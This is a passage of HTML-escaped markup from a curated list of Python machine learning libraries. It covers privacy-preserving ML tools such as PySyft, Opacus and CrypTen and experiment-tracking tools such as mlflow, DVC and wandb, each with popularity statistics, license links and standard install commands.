2.7K · 💀) - Deep recommender models using PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ylongqi/openrec&#34;&gt;OpenRec&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 390 · 💀) - OpenRec is an open-source and modular library for neural network-.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ShopRunner/collie&#34;&gt;Collie&lt;/a&gt;&lt;/b&gt; (🥉16 · ⭐ 88) - A library for preparing, training, and evaluating scalable deep.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Privacy Machine Learning&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries for encrypted and privacy-preserving machine learning using methods like federated learning &amp;amp; differential privacy.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/OpenMined/PySyft&#34;&gt;PySyft&lt;/a&gt;&lt;/b&gt; (🥇36 · ⭐ 8.1K) - A library for answering questions using data you cannot see. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/OpenMined/PySyft&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 440 · 🔀 1.8K · 📋 3.1K - 11% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/OpenMined/PySyft&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/syft&#34;&gt;PyPi&lt;/a&gt; (📥 4.5K / month · 📦 5 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install syft&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/FederatedAI/FATE&#34;&gt;FATE&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 4.3K) - An Industrial Grade Federated Learning Framework. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/FederatedAI/FATE&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 74 · 🔀 1.3K · 📋 1.2K - 33% open · ⏱️ 15.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/FederatedAI/FATE&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/ETAF&#34;&gt;PyPi&lt;/a&gt; (📥 13 / month · ⏱️ 06.05.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ETAF&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pytorch/opacus&#34;&gt;Opacus&lt;/a&gt;&lt;/b&gt; (🥈27 · ⭐ 1.1K) - Training PyTorch models with differential privacy. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pytorch/opacus&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 50 · 🔀 200 · 📥 45 · 📦 110 · 📋 180 - 21% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pytorch/opacus&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/opacus&#34;&gt;PyPi&lt;/a&gt; (📥 5.4K / month · 📦 11 · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install opacus&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/opacus&#34;&gt;Conda&lt;/a&gt; (📥 720 · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge opacus&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/privacy&#34;&gt;TensorFlow Privacy&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 1.6K) - Library for training machine learning models with.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/privacy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 46 · 🔀 350 · 📥 71 · 📋 150 - 43% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/privacy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-privacy&#34;&gt;PyPi&lt;/a&gt; (📥 33K / month · 📦 7 · ⏱️ 22.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-privacy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tf-encrypted/tf-encrypted&#34;&gt;TFEncrypted&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 1K) - A Framework for Encrypted Machine Learning in TensorFlow. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tf-encrypted/tf-encrypted&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 28 · 🔀 180 · 📦 61 · 📋 410 - 40% open · ⏱️ 10.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tf-encrypted/tf-encrypted&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tf-encrypted&#34;&gt;PyPi&lt;/a&gt; (📥 700 / month · 📦 9 · ⏱️ 07.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tf-encrypted&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/CrypTen&#34;&gt;CrypTen&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.1K) - A framework for Privacy Preserving Machine Learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/facebookresearch/CrypTen&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 29 · 🔀 170 · 📦 18 · 📋 150 - 16% open · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/facebookresearch/CrypTen&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/crypten&#34;&gt;PyPi&lt;/a&gt; (📥 240 / month · ⏱️ 09.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install crypten&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Workflow &amp;amp; Experiment Tracking&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries to organize, track, and visualize machine learning experiments.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/tensorboard&#34;&gt;Tensorboard&lt;/a&gt;&lt;/b&gt; (🥇43 · ⭐ 5.9K) - TensorFlows Visualization Toolkit. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/tensorboard&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 280 · 🔀 1.5K · 📦 110K · 📋 1.7K - 33% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/tensorboard&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorboard&#34;&gt;PyPi&lt;/a&gt; (📥 15M / month · 📦 2.4K · ⏱️ 20.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorboard&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensorboard&#34;&gt;Conda&lt;/a&gt; (📥 2.9M · ⏱️ 02.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensorboard&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mlflow/mlflow&#34;&gt;mlflow&lt;/a&gt;&lt;/b&gt; (🥇41 · ⭐ 12K) - Open source platform for the machine learning lifecycle. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/mlflow/mlflow&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 410 · 🔀 2.7K · 📋 2.4K - 43% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/mlflow/mlflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/mlflow&#34;&gt;PyPi&lt;/a&gt; (📥 11M / month · 📦 310 · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install mlflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/mlflow&#34;&gt;Conda&lt;/a&gt; (📥 570K · ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge mlflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/iterative/dvc&#34;&gt;DVC&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 9.7K) - Data Version Control | Git for Data &amp;amp; Models | ML Experiments Management. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/iterative/dvc&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 270 · 🔀 930 · 📥 84K · 📋 3.7K - 17% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/iterative/dvc&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dvc&#34;&gt;PyPi&lt;/a&gt; (📥 520K / month · 📦 47 · ⏱️ 28.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dvc&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dvc&#34;&gt;Conda&lt;/a&gt; (📥 1.1M · ⏱️ 01.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dvc&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pycaret/pycaret&#34;&gt;PyCaret&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 5.7K) - An open-source, low-code machine learning library in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pycaret/pycaret&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 78 · 🔀 1.3K · 📥 570 · 📦 2.1K · 📋 1.5K - 15% open · ⏱️ 01.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pycaret/pycaret&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pycaret&#34;&gt;PyPi&lt;/a&gt; (📥 450K / month · 📦 13 · ⏱️ 10.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pycaret&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pycaret&#34;&gt;Conda&lt;/a&gt; (📥 10K · ⏱️ 18.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pycaret&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/aws/sagemaker-python-sdk&#34;&gt;SageMaker SDK&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 1.6K) - A library for training and deploying machine learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1X&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/aws/sagemaker-python-sdk&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 260 · 🔀 780 · 📦 1.4K · 📋 1K - 33% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/aws/sagemaker-python-sdk&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sagemaker&#34;&gt;PyPi&lt;/a&gt; (📥 8.9M / month · 📦 50 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install sagemaker&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/sagemaker-python-sdk&#34;&gt;Conda&lt;/a&gt; (📥 270K · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge sagemaker-python-sdk&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/wandb/client&#34;&gt;wandb client&lt;/a&gt;&lt;/b&gt; (🥈35 · ⭐ 3.9K) - A tool for visualizing and tracking your machine learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/wandb/client&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 110 · 🔀 320 · 📋 1.9K - 25% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/wandb/client&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/wandb&#34;&gt;PyPi&lt;/a&gt; (📥 3.2M / month · 📦 260 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install wandb&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/wandb&#34;&gt;Conda&lt;/a&gt; (📥 57K · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge wandb&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Azure/MachineLearningNotebooks&#34;&gt;AzureML SDK&lt;/a&gt;&lt;/b&gt; (🥈35 · ⭐ 3.1K) - Python notebooks with ML and deep learning examples with Azure.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Azure/MachineLearningNotebooks&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 60 · 🔀 2.1K · 📥 460 · 📋 1.3K - 21% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Azure/MachineLearningNotebooks&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/azureml-sdk&#34;&gt;PyPi&lt;/a&gt; (📥 1.3M / month · 📦 46 · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install azureml-sdk&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/allegroai/clearml&#34;&gt;ClearML&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 3.2K) - ClearML - Auto-Magical CI/CD to streamline your ML workflow... &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/allegroai/clearml&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 49 · 🔀 430 · 📥 430 · 📦 250 · 📋 540 - 41% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/allegroai/clearml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/clearml&#34;&gt;PyPi&lt;/a&gt; (📥 81K / month · 📦 8 · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install clearml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/allegroai/trains&#34;&gt;Docker Hub&lt;/a&gt; (📥 30K · ⏱️ 05.10.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; docker pull allegroai/trains&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/snakemake/snakemake&#34;&gt;snakemake&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 1.4K · 📉) - This is the development home of the workflow management system.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/snakemake/snakemake&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 250 · 🔀 330 · 📦 1.1K · 📋 1K - 59% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/snakemake/snakemake&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/snakemake&#34;&gt;PyPi&lt;/a&gt; (📥 49K / month · 📦 210 · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install snakemake&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/bioconda/snakemake&#34;&gt;Conda&lt;/a&gt; (📥 440K · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c bioconda snakemake&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lanpa/tensorboardX&#34;&gt;tensorboardX&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 7.3K · 📉) - tensorboard for pytorch (and chainer, mxnet, numpy, ...). &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lanpa/tensorboardX&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 71 · 🔀 850 · 📥 350 · 📦 19K · 📋 440 - 16% open · ⏱️ 15.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/lanpa/tensorboardX&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorboardX&#34;&gt;PyPi&lt;/a&gt; (📥 3M / month · 📦 880 · ⏱️ 22.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorboardX&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensorboardx&#34;&gt;Conda&lt;/a&gt; (📥 690K · ⏱️ 23.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensorboardx&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Netflix/metaflow&#34;&gt;Metaflow&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 5.6K) - Build and manage real-life data science projects with ease!. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/Netflix/metaflow&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 52 · 🔀 510 · 📦 290 · 📋 450 - 49% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/Netflix/metaflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/metaflow&#34;&gt;PyPi&lt;/a&gt; (📥 52K / month · 📦 9 · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install metaflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/metaflow&#34;&gt;Conda&lt;/a&gt; (📥 40K · ⏱️ 14.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge metaflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/IDSIA/sacred&#34;&gt;sacred&lt;/a&gt;&lt;/b&gt; (🥈31 · ⭐ 